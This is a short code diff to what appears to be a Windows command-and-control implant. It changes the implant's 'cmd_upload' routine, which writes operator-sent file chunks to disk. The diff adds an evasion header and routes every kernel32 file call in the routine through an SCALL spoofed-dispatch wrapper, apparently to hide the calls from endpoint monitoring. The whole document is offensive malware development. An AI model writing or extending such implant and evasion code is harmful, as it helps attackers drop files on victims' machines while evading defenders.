@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_UPLOAD
 
@@ -59,10 +60,10 @@ auto declfn starburst::cmd_upload(
 
     // open/create file
     wchar_t wpath[520] = { 0 };
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, path_buf, -1, wpath, 520 );
 
     DWORD create_flag = ( chunk_num == 1 ) ? CREATE_ALWAYS : OPEN_EXISTING;
-    HANDLE h_file = inst.kernel32.CreateFileW(
+    HANDLE h_file = (HANDLE)SCALL( inst, kernel32.CreateFileW,
         wpath,
         GENERIC_WRITE,
         0,
@@ -80,16 +81,16 @@ auto declfn starburst::cmd_upload(
 
     // seek to end for append (chunk > 1)
     if ( chunk_num > 1 ) {
-        inst.kernel32.SetFilePointer( h_file, 0, nullptr, FILE_END );
+        SCALL( inst, kernel32.SetFilePointer, h_file, 0, nullptr, FILE_END );
     }
 
     // write chunk
     if ( chunk_data && chunk_data_len > 0 ) {
         DWORD written = 0;
-        inst.kernel32.WriteFile( h_file, chunk_data, chunk_data_len, &written, nullptr );
+        SCALL( inst, kernel32.WriteFile, h_file, chunk_data, chunk_data_len, &written, nullptr );
     }
 
-    inst.kernel32.CloseHandle( h_file );
+    SCALL( inst, kernel32.CloseHandle, h_file );
 
     if ( chunk_num < total_chunks ) {
         // request next chunk
